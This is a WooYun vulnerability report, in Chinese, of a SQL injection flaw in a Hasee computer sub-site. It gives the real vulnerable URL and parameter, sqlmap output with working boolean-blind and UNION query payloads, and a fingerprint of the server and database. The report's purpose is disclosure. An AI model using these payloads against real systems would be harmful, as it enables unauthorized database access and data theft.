wybug_title: 神舟电脑某分站存在注入漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2014-05-28：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-07-12：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 注入漏洞 详细说明：  http://dzb.hasee.com/english/products/showpicture.asp?ud=16&id=661   漏洞证明：  [23:31:33] [INFO] resuming back-end DBMS 'microsoft access'[23:31:33] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://dzb.hasee.com:80/english/products/showpicture.asp?ud=16&id=661 AND 8893=8893    Type: UNION query    Title: Generic UNION query (NULL) - 48 columns    Payload: http://dzb.hasee.com:80/english/products/showpicture.asp?ud=16&id=-6509 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)&CHR(120)&CHR(100)&CHR(108)&CHR(113)&CHR(81)&CHR(99)&CHR(75)&CHR(115)&CHR(110)&CHR(67)&CHR(101)&CHR(100)&CHR(97)&CHR(109)&CHR(113)&CHR(112)&CHR(105)&CHR(122)&CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM MSysAccessObjects%16---[23:31:33] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access   修复方案：  过滤   版权声明：转载请注明来源 M4ster@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
